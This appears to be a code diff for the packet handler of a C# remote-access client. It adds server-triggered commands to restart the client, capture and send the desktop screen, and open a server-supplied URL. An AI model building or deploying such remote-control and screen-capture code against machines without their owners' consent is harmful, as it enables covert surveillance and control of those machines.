@@ -71,8 +71,22 @@ namespace Client.Handle_Packet
                             try
                             {
                                 ClientSocket.Client.Shutdown(SocketShutdown.Both);
+                                ClientSocket.Client.Dispose();
                             }
                             catch { }
+                            Environment.Exit(0);
+                        }
+                        break;
+
+                    case "restart":
+                        {
+                            try
+                            {
+                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
+                                ClientSocket.Client.Dispose();
+                            }
+                            catch { }
+                            Process.Start(Application.ExecutablePath);
                             Environment.Exit(0);
                         }
                         break;
@@ -96,16 +110,18 @@ namespace Client.Handle_Packet
                             {
                                 case "false":
                                     {
-                                        if (RemoteDesktop.RemoteDesktopStatus == false) return;
-                                        RemoteDesktop.RemoteDesktopStatus = false;
+                                        //if (RemoteDesktop.RemoteDesktopStatus == false) return;
+                                        // RemoteDesktop.RemoteDesktopStatus = false;
                                     }
                                     break;
 
                                 case "true":
                                     {
-                                        if (RemoteDesktop.RemoteDesktopStatus == true) return;
-                                        RemoteDesktop.RemoteDesktopStatus = true;
-                                        RemoteDesktop.CaptureAndSend();
+                                        // if (RemoteDesktop.RemoteDesktopStatus == true) return;
+                                        // RemoteDesktop.RemoteDesktopStatus = true;
+                                        // RemoteDesktop.CaptureAndSend();
+                                        RemoteDesktop remoteDesktop = new RemoteDesktop();
+                                        remoteDesktop.CaptureAndSend();
                                     }
                                     break;
                             }
@@ -210,6 +226,17 @@ namespace Client.Handle_Packet
                             }
                         }
                         break;
+
+                    case "visitURL":
+                        {
+                            string url = unpack_msgpack.ForcePathObject("URL").AsString;
+                            if (url.StartsWith("http"))
+                            {
+                                Process.Start(url);
+                            }
+                        }
+                        break;
+
                 }
             }
             catch { }
